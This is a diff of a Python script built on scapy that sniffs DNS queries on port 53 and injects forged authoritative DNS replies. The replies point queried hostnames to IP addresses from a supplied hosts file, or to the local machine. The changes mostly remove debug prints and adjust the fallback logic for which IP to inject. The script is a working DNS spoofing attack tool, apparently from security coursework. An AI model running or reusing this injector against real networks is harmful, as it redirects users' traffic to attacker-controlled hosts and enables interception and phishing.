@@ -4,12 +4,12 @@ from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
 import netifaces
 from scapy.all import *
 
+# TODO - bpf, trace file
+
 hips = dict()
 localhost_ip = None
 #pkt.getlayer(DNS).qr == 0
 def get_localhost_ip(interface=None):
-    return "12.12.33.33"
-'''
     if interface:
         return netifaces.ifaddresses(interface)[AF_INET][0]['addr']
     else:
@@ -18,24 +18,21 @@ def get_localhost_ip(interface=None):
                 #links = netifaces.ifaddresses(interface)[netifaces.AF_INET]
                 for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                     #if "10." in link['addr'] or "172." in link['addr'] or "192." in link['addr']:
-                    print 'printing link addr', link['addr']
+                    #print 'printing link addr', link['addr']
                     if "127.0.0.1" not in link['addr']:
                         return link['addr']
             except Exception as e:
                 pass
     return None
-'''
+
 def respond_with_ip(q_name):
-    global hips
     for h, ip in hips.iteritems():
         #print 'checking for q_name', q_name, 'and h', h
         if q_name in h:
             if 'www.' not in q_name:
                 if 'www.' + q_name in h:
-                    print 'badhai ho for', q_name
                     return ip
             else:
-                print 'yo badhai ho for', q_name
                 return ip
     return None
 
@@ -45,12 +42,13 @@ def process_pkt(pkt):
         #print pkt[DNSQR].qname
         #print src_ip, dst_ip
         q_name = pkt[DNSQR].qname.rstrip('.')
-        print 'checking for', q_name
-        r_ip = respond_with_ip(q_name) or localhost_ip
-        print 'answer ip', r_ip
-        if not r_ip:
+        r_ip = respond_with_ip(q_name)
+        print 'dns query for', q_name
+        if not r_ip and len(hips):
             return
-
+        elif not r_ip:
+            r_ip = localhost_ip
+        print 'injecting', r_ip
         inj_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                   DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
@@ -76,11 +74,11 @@ def main(argv):
         elif opt in ("-h", "--hostsfile"):
             hostsfile = arg
 
-    print interface
-    print hostsfile
+    #print interface
+    #print hostsfile
 
     localhost_ip = get_localhost_ip()
-    print 'localhost_ip is', localhost_ip
+    #print 'localhost ip is', localhost_ip
 
     if hostsfile:
         with open(hostsfile) as f:
@@ -93,12 +91,12 @@ def main(argv):
             else:
                 hips['www.' + hostname] = ip
 
-        print hips
+        #print hips
 
     if interface:
         sniff(iface=interface, filter='udp and port 53', store=0, prn=process_pkt)
     else:
-        sniff(filter='udp and port 53', store=0, prn=process_pkt)
+        sniff(filter='udp port 53', store=0, prn=process_pkt)
 
 if __name__ == "__main__":
    main(sys.argv[1:])
